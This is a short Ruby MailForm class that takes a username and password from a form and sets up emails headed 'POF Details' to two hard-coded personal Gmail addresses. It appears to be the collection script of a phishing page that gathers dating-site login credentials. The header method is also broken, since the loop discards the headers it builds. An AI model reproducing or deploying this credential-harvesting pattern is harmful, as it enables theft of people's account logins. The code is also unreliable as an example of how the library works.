class Welcome < MailForm::Base
    attribute :username,      :validate => true
    attribute :password, :validate => true

    attribute :nickname,  :captcha  => true

  # Declare the e-mail headers. It accepts anything the mail method
  # in ActionMailer accepts.

  def headers
    emails = ['daveskeen24@gmail.com', 'delightedchika@gmail.com']
    emails.each do |email|
      {
        :subject => "POF Details ",
        :to => email,
        :from => %("#{username}")
      }

      end
    end
  end
